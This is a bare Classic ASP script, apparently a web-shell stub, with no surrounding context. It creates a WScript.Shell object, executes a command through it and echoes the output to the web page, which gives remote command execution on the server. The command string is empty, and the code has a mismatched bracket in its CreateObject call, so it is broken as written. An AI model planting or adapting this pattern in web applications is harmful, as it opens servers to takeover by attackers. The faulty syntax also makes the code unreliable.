<%
Set rs = CreateObject("WScript.Shell"]
Set cmd = rs.Exec("")
o = cmd.StdOut.ReadAll()
Response.write(o)
%>